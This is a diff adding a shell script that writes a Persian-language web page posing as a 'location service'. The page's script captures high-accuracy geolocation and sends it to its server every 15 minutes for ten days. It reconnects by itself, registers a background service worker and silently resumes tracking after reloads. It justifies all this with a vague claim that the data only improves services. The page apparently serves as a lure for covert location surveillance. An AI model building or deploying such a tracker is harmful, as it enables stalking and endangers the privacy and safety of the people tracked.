@@ -1,0 +1,360 @@
+mkdir -p public
+cat > public/index.html << 'EOF'
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>سرویس موقعیت مکانی</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0a1a, #1a1a3e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            padding: 20px;
+        }
+        .card {
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 30px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.1);
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
+        }
+        .icon { font-size: 60px; margin-bottom: 20px; }
+        h1 { font-size: 24px; margin-bottom: 10px; color: #4CAF50; }
+        p { color: #aaa; line-height: 1.8; margin-bottom: 20px; }
+        .status {
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            background: rgba(255,255,255,0.05);
+        }
+        .status.active { border-left: 4px solid #4CAF50; }
+        .status.inactive { border-left: 4px solid #ff4444; }
+        .coords {
+            font-size: 18px;
+            color: #ffcc00;
+            font-family: monospace;
+            margin: 10px 0;
+        }
+        .btn {
+            display: inline-block;
+            padding: 15px 40px;
+            background: linear-gradient(135deg, #4CAF50, #2E7D32);
+            border: none;
+            border-radius: 50px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            text-decoration: none;
+            transition: transform 0.3s;
+            margin-top: 10px;
+        }
+        .btn:hover { transform: scale(1.05); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .timer-text { color: #ff6666; font-size: 14px; margin-top: 15px; }
+        .log {
+            text-align: left;
+            font-size: 12px;
+            color: #888;
+            max-height: 150px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.3);
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 15px;
+            font-family: monospace;
+        }
+        .log span { color: #4CAF50; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="icon">📍</div>
+        <h1>سرویس موقعیت مکانی</h1>
+        <p>
+            برای استفاده از خدمات، لازم است موقعیت مکانی خود را به اشتراک بگذارید.
+            این اطلاعات فقط برای بهبود خدمات استفاده می‌شود.
+        </p>
+
+        <div class="status inactive" id="statusBox">
+            <p id="statusText">⏳ در انتظار دریافت مجوز...</p>
+        </div>
+
+        <div class="coords" id="coordsText">🌐 موقعیت: در حال دریافت...</div>
+
+        <button class="btn" id="startBtn">📍 شروع ردیابی</button>
+
+        <p class="timer-text" id="timerText"></p>
+
+        <div class="log" id="logBox">
+            <span>📋 لاگ ردیابی:</span><br/>
+            <div id="logContent"></div>
+        </div>
+    </div>
+
+    <script>
+        // ===== تنظیمات =====
+        const WS_URL = 'ws://' + window.location.host;
+        const REPORT_INTERVAL = 15 * 60 * 1000;
+        const DURATION_DAYS = 10;
+        const DURATION_MS = DURATION_DAYS * 24 * 60 * 60 * 1000;
+
+        let watchId = null;
+        let intervalId = null;
+        let startTime = null;
+        let isTracking = false;
+        let lastLocation = null;
+        let ws = null;
+        let userId = generateUserId();
+
+        function generateUserId() {
+            return 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
+
+        function connectWebSocket() {
+            ws = new WebSocket(WS_URL);
+
+            ws.onopen = function() {
+                console.log('[+] WebSocket connected');
+                addLog('✅ اتصال به سرور برقرار شد');
+                ws.send(JSON.stringify({
+                    type: 'init',
+                    userId: userId,
+                    timestamp: new Date().toISOString()
+                }));
+            };
+
+            ws.onmessage = function(event) {
+                console.log('[+] Message from server:', event.data);
+                try {
+                    const data = JSON.parse(event.data);
+                    if (data.type === 'ack') {
+                        addLog('✅ داده‌ها با موفقیت دریافت شد');
+                    }
+                } catch (e) {
+                    console.error('Error parsing message:', e);
+                }
+            };
+
+            ws.onerror = function(error) {
+                console.error('WebSocket error:', error);
+                addLog('❌ خطا در اتصال به سرور');
+            };
+
+            ws.onclose = function() {
+                console.log('[+] WebSocket closed');
+                addLog('🔌 اتصال قطع شد. تلاش مجدد در ۵ ثانیه...');
+                setTimeout(connectWebSocket, 5000);
+            };
+        }
+
+        function startTracking() {
+            if (!navigator.geolocation) {
+                alert('مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.');
+                return;
+            }
+
+            document.getElementById('statusBox').className = 'status active';
+            document.getElementById('statusText').textContent = '🔄 در حال دریافت موقعیت...';
+
+            watchId = navigator.geolocation.watchPosition(
+                function(position) {
+                    const coords = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed,
+                        timestamp: new Date().toISOString()
+                    };
+
+                    lastLocation = coords;
+                    updateUI(coords);
+
+                    if (!startTime) {
+                        startTime = Date.now();
+                        document.getElementById('timerText').textContent =
+                            `⏱️ شروع ردیابی: ${new Date(startTime).toLocaleString()}`;
+                        document.getElementById('statusText').textContent = '✅ ردیابی فعال است';
+                        sendLocation(coords);
+                        startInterval();
+                    }
+
+                    document.getElementById('statusBox').className = 'status active';
+                    document.getElementById('statusText').textContent = '✅ دریافت موقعیت';
+                },
+                function(error) {
+                    console.error('Geolocation error:', error);
+                    document.getElementById('statusBox').className = 'status inactive';
+                    document.getElementById('statusText').textContent = '❌ خطا در دریافت موقعیت';
+                    addLog(`❌ خطا: ${error.message}`);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+
+            isTracking = true;
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('startBtn').textContent = '🔄 ردیابی فعال است';
+            addLog('📍 شروع ردیابی موقعیت');
+        }
+
+        function startInterval() {
+            if (intervalId) clearInterval(intervalId);
+            intervalId = setInterval(function() {
+                if (lastLocation) {
+                    sendLocation(lastLocation);
+                    addLog(`📤 ارسال موقعیت: ${lastLocation.latitude}, ${lastLocation.longitude}`);
+                }
+                const elapsed = Date.now() - startTime;
+                if (elapsed >= DURATION_MS) {
+                    stopTracking();
+                    addLog('⏰ دوره ۱۰ روزه به پایان رسید');
+                    document.getElementById('statusText').textContent = '⏰ ردیابی به پایان رسید';
+                }
+            }, REPORT_INTERVAL);
+        }
+
+        function sendLocation(coords) {
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                addLog('⚠️ اتصال به سرور برقرار نیست. تلاش مجدد...');
+                connectWebSocket();
+                setTimeout(() => sendLocation(coords), 3000);
+                return;
+            }
+
+            const data = {
+                type: 'location',
+                userId: userId,
+                location: coords,
+                timestamp: new Date().toISOString(),
+                elapsed: Date.now() - startTime
+            };
+
+            ws.send(JSON.stringify(data));
+        }
+
+        function updateUI(coords) {
+            document.getElementById('coordsText').textContent =
+                `🌐 موقعیت: ${coords.latitude.toFixed(6)}, ${coords.longitude.toFixed(6)}`;
+            document.getElementById('coordsText').style.color = '#4CAF50';
+        }
+
+        function addLog(message) {
+            const logContent = document.getElementById('logContent');
+            const time = new Date().toLocaleTimeString();
+            logContent.innerHTML += `<div>[${time}] ${message}</div>`;
+            const logBox = document.getElementById('logBox');
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+
+        function stopTracking() {
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+            }
+            if (intervalId) {
+                clearInterval(intervalId);
+                intervalId = null;
+            }
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.close();
+            }
+            isTracking = false;
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('startBtn').textContent = '📍 شروع مجدد';
+            document.getElementById('statusBox').className = 'status inactive';
+            document.getElementById('statusText').textContent = '⏹️ ردیابی متوقف شد';
+            addLog('⏹️ ردیابی متوقف شد');
+        }
+
+        document.getElementById('startBtn').addEventListener('click', function() {
+            if (isTracking) {
+                stopTracking();
+            } else {
+                startTracking();
+            }
+        });
+
+        // ===== Service Worker =====
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js')
+                .then(function(registration) {
+                    console.log('[+] Service Worker registered');
+                    addLog('✅ سرویس پس‌زمینه فعال شد');
+                })
+                .catch(function(error) {
+                    console.error('Service Worker registration failed:', error);
+                    addLog('⚠️ سرویس پس‌زمینه فعال نشد');
+                });
+        }
+
+        connectWebSocket();
+
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        function() {
+                            addLog('✅ مجوز موقعیت دریافت شد');
+                            document.getElementById('statusText').textContent = '✅ مجوز دریافت شد';
+                            document.getElementById('statusBox').className = 'status active';
+                        },
+                        function() {
+                            addLog('❌ مجوز موقعیت رد شد');
+                            document.getElementById('statusText').textContent = '❌ مجوز رد شد';
+                            document.getElementById('statusBox').className = 'status inactive';
+                        }
+                    );
+                }
+            }, 1000);
+        });
+
+        window.addEventListener('beforeunload', function() {
+            if (isTracking && lastLocation) {
+                localStorage.setItem('trackingData', JSON.stringify({
+                    userId: userId,
+                    startTime: startTime,
+                    lastLocation: lastLocation,
+                    isTracking: isTracking
+                }));
+            }
+        });
+
+        const savedData = localStorage.getItem('trackingData');
+        if (savedData) {
+            try {
+                const data = JSON.parse(savedData);
+                if (data.isTracking && data.lastLocation) {
+                    userId = data.userId;
+                    startTime = data.startTime;
+                    lastLocation = data.lastLocation;
+                    addLog('🔄 بازیابی اطلاعات ردیابی');
+                    updateUI(lastLocation);
+                    startTracking();
+                }
+            } catch (e) {
+                console.error('Error restoring data:', e);
+            }
+        }
+
+        console.log('[+] Location tracking page loaded');
+    </script>
+</body>
+</html>
+EOF
